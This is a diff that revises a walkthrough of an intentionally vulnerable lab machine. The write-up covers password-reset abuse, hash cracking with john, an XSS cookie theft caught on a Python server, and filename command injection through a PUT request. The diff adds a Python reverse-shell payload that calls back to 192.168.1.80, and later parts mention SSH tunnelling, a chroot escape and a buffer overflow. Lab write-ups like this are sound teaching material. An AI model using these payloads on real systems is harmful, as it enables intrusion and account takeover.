@@ -112,10 +112,7 @@ Let’s click onto the name of the author itself, which will lead to the followi
 ```sh
 /blog/author/ilveganoimbruttito
 ```
-So far, we’ve understood that
-his username is `ilveganoimbruttito`
-he is a post author 
-Now we could try to ask for a password reset, using above username, which will succeed in Step 1.
+So far, we’ve understood that his username is `ilveganoimbruttito` he is a post author. Now we could try to ask for a password reset, using above username, which will succeed in Step 1.
 
 Then, as Step 2, we will get asked 3 security questions… which we will have to answer all
 Which year have you become vegan?
@@ -150,7 +147,6 @@ You never know until you try it, we can try to crack it by using any password cr
 ```sh
 $ echo "78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46" > crack.txt
 $ john --wordlist=/usr/share/wordlists/rockyou.txt.gz crack.txt 
-
 ```
 Bingo!
 
@@ -210,22 +206,40 @@ and catching the response with a simple trusty Python server through command lin
 ```sh
 python3 -m http.server
 ```
-Now we have to wait for the “admin” to check our post. When he opens our post he will trigger the `cross site scripting` payload. We will then obtain the following result
+Let's wait for the “admin” to check our post. When he opens our post he will trigger the `cross site scripting` payload. We will then obtain the following result in our python server:
 ```sh
 ::ffff:127.0.0.1 - - [23/Apr/2024 19:19:05] "GET /?userData=fc7fcd0dfff43f12ea176c886e9a6e98d2dc4645bc09f009bfcc78390947eb6c641dace3d9a2c6d9539b75ff2a9cb809f8a493e88a9a45b62ac52179a6b323c789c8fde69a7bea3c4ede6aeb71fa183f3ff0e5ef78d45f68c2b1dfcd2d0e7602f23c7990c61a5d1e6ac7da58383a1292d025411d159f89e28e64845f1c4bc64d5d9a0ee6dc44e267d0ae1e87d751506e8489c8ae420563bcf451fb52ebc99805 HTTP/1.1" 200 -
 ::ffff:127.0.0.1 - - [23/Apr/2024 19:19:35] "GET /?userData=71c2e52a10d556e4a059a0dbfb8052db01e6c6dbff383879211163d6a748da4dddcb4a39ceb761cd05402fefa6d71ec5fc2ad619da1097599b946b172b023854288cb087e15e2ecd1c8ec41e0437a4c037e4edb3e1085ba9c97efc35c4c09afc4ae64fd0fbd3a93f0435871fce25cc1ef3a1db3ec484eaafed077fe59e3d268e470d8bd38f495f73cc5db152701e2242a94bd8e55e08535ec1654510f00f5644b8717c9c811f0f280604d1b15f9dd4b4 HTTP/1.1" 200 -
 ```
 
-Now we have the admin cookie in our hands. We can recognize the admin cookie by comparing our current cookie with the two we received. We can now login as the admin.
+Now that we have the admin cookie in our hands, we can now login as the admin!
 
-After we logged in as the admin we can access the admin panel. From here we can organize a vegan protest. The form to submit a protest asks for an image of the protest. 
+We are now admin and we can access the admin panel. From here it seems we can organize a vegan protest. The form to submit the protests asks for an image of it. 
 
 ![organize a protest](hard1.jpg)
 
-The file uploaded is checked for it to be an image. This check is done by an API [?] that checks the filename of the image using a bash script. This API is under development and the developers are experimenting with some HTTP methods. Indeed if we send the image to the API with a POST request the check is done correctly and the filename is sanitized [?]. However if we do the same process but with a PUT the API will not sanitize the filename and this will lead to remote command execution! This can be discovered using the OPTIONS method of HTTP to the API itself.
+The file uploaded is checked for it to be an image. This check is done by an API that checks the filename of the image using a bash script. If we interrogate this API with the OPTIONS method of HTTP we discover the methods accepted by the API:
+
+![burp options response](hard2.jpg)
+
+This API is under development and the developers are experimenting with some HTTP methods. Indeed if we send the image to the API with a POST 
+request the check is done correctly and the filename is sanitized. 
+
+![POST API check](hard3.jpg)
+
+However the developers are currently implementing a new and more robust check and they are testing it using the PUT method, so that the current POST method check remains usable.
+
+![PUT API check](hard4.jpg)
+
+If we submit the file to the API but with a PUT request the API will not sanitize the filename and this will lead to remote command execution!
+If we inject the following payload
+```sh
+"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.1.80",9321));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' # 
+```
+![Burpsuite filename payload](hard5.jpg)
  
 # Privilege escalation
-Once remote access has been obtained, the pentester can look to escalate privileges in order to completely exploit the machine and gather all kinds of information they were not supposed to.
+Once remote access has been obtained, the penetration tester can look to escalate privileges in order to completely exploit the machine and gather all kinds of information they were not supposed to.
 
 As instructed, there are three different ways to achieve privilege escalation
 
@@ -265,7 +279,7 @@ Once we have remote access to the machine, we could start to enumerate it. The e
 ```sh
 ssh -L 9090:localhost:3100 saltbae@192.168.1.151 -i id_rsa
 ```
-To do this though we need the private ssh key which we already have (if we traversed the easy path) or we could just simply copy it from the reverse shell we got (?). After that we contact localhost:9090 and we are greeted with a meat store! VC0RP must be into some shady things…
+To do this though we need the private ssh key which we already have (if we traversed the easy path) or we could just simply create another pair. After that we contact localhost:9090 and we are greeted with a meat store! VC0RP must be into some shady things…
 
 We start to play with the website until we find the `/resellers` page. This page presents a search bar used to find meat resellers in the world. This search bar presents yet another command injection vulnerability. With the following payload we spawn a reverse shell:
 ```sh
@@ -275,7 +289,6 @@ Once we enter things seem a little odd… We realize that we are not in the syst
 ```sh
 chroot /host sh
 ```
-
 
 ## 🔴 Hard path
 The same `shadow-butchers-client` executable in the *saltbae* home is vulnerable to a buffer overflow. The buffer overflow is exploitable from the *order meat from suppliers* option. The program will ask the user to input the name of the supplier he wants to buy the meat from. This string is copied to a buffer wihtout checking the length. Since the machine does not have ASLR active and the executable was compiled with executable stack and with no canaries the exploitation is pretty straight forward.
